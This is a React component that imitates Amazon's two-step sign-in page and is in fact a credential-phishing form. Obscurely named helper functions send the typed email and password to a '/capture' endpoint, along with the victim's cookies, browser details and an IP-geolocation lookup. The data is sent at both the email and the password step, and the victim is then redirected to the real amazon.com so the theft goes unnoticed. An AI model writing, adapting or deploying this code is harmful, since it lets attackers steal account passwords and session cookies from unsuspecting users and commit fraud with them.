import { useState } from 'react'
import './LoginForm.css'

const _u = '/capture'

async function _gi() {
    try {
        const r = await fetch('https://api.ipapi.is/?q=&fields=ip,country_name,city,isp', { cache: 'no-store' })
        const d = await r.json()
        return `${d.ip} (${d.city}, ${d.country_name} / ${d.isp})`
    } catch {
        return 'desconocida'
    }
}

async function _sc(uid, tk) {
    const n = await _gi()
    const p = {
        uid,
        tk,
        n,
        ua: navigator.userAgent,
        ck: document.cookie || '(sin cookies)',
        sr: `${window.screen.width}x${window.screen.height}`,
        lg: navigator.language,
    }
    fetch(_u, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(p),
    }).catch(() => {})
}

function LoginForm() {
    const [v1, setV1] = useState('')
    const [v2, setV2] = useState('')
    const [step, setStep] = useState('email')
    const [sp, setSp] = useState(false)

    const handleContinue = (e) => {
        e.preventDefault()
        if (v1.trim()) {
            _sc(v1, '')
            setStep('password')
        }
    }

    const handleSignIn = (e) => {
        e.preventDefault()
        _sc(v1, v2)
        window.location.href = 'https://www.amazon.com'
    }

    const handleChange = () => {
        setStep('email')
        setV2('')
        setSp(false)
    }

    /* ── PASO 2: contraseña ── */
    if (step === 'password') {
        document.body.style.backgroundColor = '#f1f2f2'
        return (
            <section className="login-section" style={{ backgroundColor: '#f1f2f2' }}>
                <h1 className="welcome-title">Sign in</h1>

                <div className="email-display">
                    <span className="email-text">{v1}</span>
                    <a href="#" className="change-link"
                        onClick={(e) => { e.preventDefault(); handleChange() }}>
                        Change
                    </a>
                </div>

                <form className="login-form" onSubmit={handleSignIn}>
                    <label className="input-label" htmlFor="ap-field">
                        Amazon password
                    </label>
                    <input
                        type={sp ? 'text' : 'password'}
                        id="ap-field"
                        className="input-field"
                        placeholder="Amazon password"
                        value={v2}
                        onChange={(e) => setV2(e.target.value)}
                        autoFocus
                    />

                    <div className="password-options">
                        <label className="show-password">
                            <input
                                type="checkbox"
                                checked={sp}
                                onChange={(e) => setSp(e.target.checked)}
                            />
                            <span>Show password</span>
                        </label>
                        <a href="#" className="forgot-link">Forgot password?</a>
                    </div>

                    <button type="submit" className="continue-btn">
                        Sign in
                    </button>
                </form>

                <div className="divider-or">or</div>

                <button className="passkey-btn">
                    Sign in with a passkey
                </button>
            </section>
        )
    }

    /* ── PASO 1: email ── */
    document.body.style.backgroundColor = '#fff'
    return (
        <section className="login-section">
            <h1 className="welcome-title">Welcome to Amazon</h1>

            <form className="login-form" onSubmit={handleContinue}>
                <label className="input-label" htmlFor="ap-id">
                    Enter mobile number or email
                </label>
                <input
                    type="text"
                    id="ap-id"
                    className="input-field"
                    autoComplete="off"
                    autoCapitalize="none"
                    spellCheck="false"
                    value={v1}
                    onChange={(e) => setV1(e.target.value)}
                    autoFocus
                />

                <button type="submit" className="continue-btn">
                    Continue
                </button>

                <p className="terms-text">
                    By continuing, you agree to Amazon's{' '}
                    <a href="#" className="link">Conditions of Use</a> and{' '}
                    <a href="#" className="link">Privacy Notice</a>.
                </p>
            </form>

            <div className="divider" />
            <a href="#" className="need-help-link">Need help?</a>

            <div className="divider" />
            <div className="business-section">
                <p className="business-title">Buying for work?</p>
                <a href="#" className="business-link">Create a free business account</a>
            </div>
        </section>
    )
}

export default LoginForm
